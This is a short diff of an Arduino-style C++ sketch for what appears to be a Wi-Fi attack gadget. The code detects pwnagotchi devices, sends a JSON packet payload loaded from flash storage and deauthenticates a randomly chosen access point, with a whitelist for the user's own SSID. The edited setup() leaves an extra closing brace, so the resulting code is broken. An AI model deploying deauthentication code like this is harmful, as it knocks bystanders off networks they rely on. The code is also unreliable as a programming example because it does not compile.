@@ -9,9 +9,16 @@ PacketSender packetSender;
 DeauthAttack deauthAttack;
 
 void setup() {
-    // more stuff here
     Serial.begin(115200); // this is the rate for the serial monitor
     deauthAttack.addToWhitelist("SSID"); // set your ssid you want to use
+    if (SPIFFS.begin()) {
+        // Use the appropriate file path
+        packetSender.sendJsonPayloadFromFile("/packet.json");
+    } else {
+        Serial.println("Failed to mount file, does the file exist?");
+  }
+}
+
 }
 
 void loop() {
@@ -19,8 +26,6 @@ void loop() {
     pwnagotchi.detectPwnagotchi("de:ad:be:ef:de:ad");
 
     // send payload
-    const char* essid = "de:ad:be:ef:de:ad";
-    String jsonPayload = packetSender.sendJsonPayload(essid);
 
     // deauth a random ap
     deauthAttack.selectRandomAP();
